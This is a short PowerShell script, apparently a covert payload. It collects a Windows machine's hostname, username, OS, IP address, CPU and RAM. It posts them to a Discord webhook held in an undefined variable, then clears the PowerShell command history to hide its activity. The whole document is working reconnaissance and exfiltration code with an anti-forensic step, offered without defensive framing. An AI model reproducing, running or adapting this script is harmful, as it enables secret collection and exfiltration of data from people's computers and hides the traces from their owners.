# Collect device information
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$os = Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Caption
$ipAddress = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4" -and $_.PrefixOrigin -eq "Dhcp"}).IPAddress
$cpu = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
$ram = [math]::round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)

# Prepare the message to send
$message = @{
    content = "Device Information:"
    embeds = @(@{
        title = "Device Information"
        color = 16711680
        fields = @(
            @{name = "Hostname"; value = $hostname; inline = $true},
            @{name = "Username"; value = $username; inline = $true},
            @{name = "Operating System"; value = $os; inline = $true},
            @{name = "IP Address"; value = $ipAddress; inline = $true},
            @{name = "CPU"; value = $cpu; inline = $true},
            @{name = "RAM (GB)"; value = "$ram GB"; inline = $true}
        )
    })
}

# Convert the message to JSON format
$jsonMessage = $message | ConvertTo-Json -Depth 4

# Send the message to the Discord webhook
Invoke-RestMethod -Uri $discord -Method Post -ContentType "application/json" -Body $jsonMessage

# Clear the PowerShell command history
Clear-History
